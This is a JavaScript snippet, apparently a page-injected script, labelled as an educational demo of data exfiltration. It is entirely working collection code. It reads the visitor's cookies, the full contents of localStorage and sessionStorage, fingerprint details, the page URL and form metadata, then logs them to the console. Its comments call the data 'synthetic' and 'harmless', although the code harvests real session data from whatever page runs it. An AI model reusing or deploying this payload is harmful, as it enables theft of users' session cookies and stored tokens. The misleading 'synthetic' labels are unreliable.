div.script:
// SYNTHETIC DATA EXFILTRATION DEMO - FOR EDUCATIONAL PURPOSES ONLY
// This demonstrates advanced data exfiltration techniques

console.log('[EDUCATIONAL DEMO] Advanced data exfiltration simulation started');

// Simulate comprehensive data collection (harmless for educational purposes)
var comprehensiveData = {
  timestamp: new Date().toISOString(),
  demoType: 'Advanced Data Exfiltration',

  // Browser Information
  browser: {
    userAgent: navigator.userAgent,
    language: navigator.language,
    languages: navigator.languages,
    platform: navigator.platform,
    cookieEnabled: navigator.cookieEnabled,
    onLine: navigator.onLine,
    hardwareConcurrency: navigator.hardwareConcurrency,
    deviceMemory: navigator.deviceMemory,
    maxTouchPoints: navigator.maxTouchPoints
  },

  // Screen Information
  screen: {
    width: screen.width,
    height: screen.height,
    availWidth: screen.availWidth,
    availHeight: screen.availHeight,
    colorDepth: screen.colorDepth,
    pixelDepth: screen.pixelDepth
  },

  // Window Information
  window: {
    innerWidth: window.innerWidth,
    innerHeight: window.innerHeight,
    outerWidth: window.outerWidth,
    outerHeight: window.outerHeight,
    location: window.location.href,
    referrer: document.referrer,
    title: document.title
  },

  // Storage Data
  storage: {
    cookies: document.cookie || 'No cookies',
    localStorage: (function() {
      var items = {};
      for (var i = 0; i < localStorage.length; i++) {
        var key = localStorage.key(i);
        items[key] = localStorage.getItem(key);
      }
      return items;
    })(),
    sessionStorage: (function() {
      var items = {};
      for (var i = 0; i < sessionStorage.length; i++) {
        var key = sessionStorage.key(i);
        items[key] = sessionStorage.getItem(key);
      }
      return items;
    })()
  },

  // Form Data (simulated)
  forms: (function() {
    var formData = {};
    var forms = document.forms;
    for (var i = 0; i < forms.length; i++) {
      var form = forms[i];
      formData['form_' + i] = {
        action: form.action,
        method: form.method,
        id: form.id,
        name: form.name
      };
    }
    return formData;
  })(),

  // Network Information (simulated)
  network: {
    connection: navigator.connection ? {
      effectiveType: navigator.connection.effectiveType,
      downlink: navigator.connection.downlink,
      rtt: navigator.connection.rtt
    } : 'Not available'
  }
};

console.log('[EDUCATIONAL DEMO] Comprehensive data collected (synthetic):', comprehensiveData);

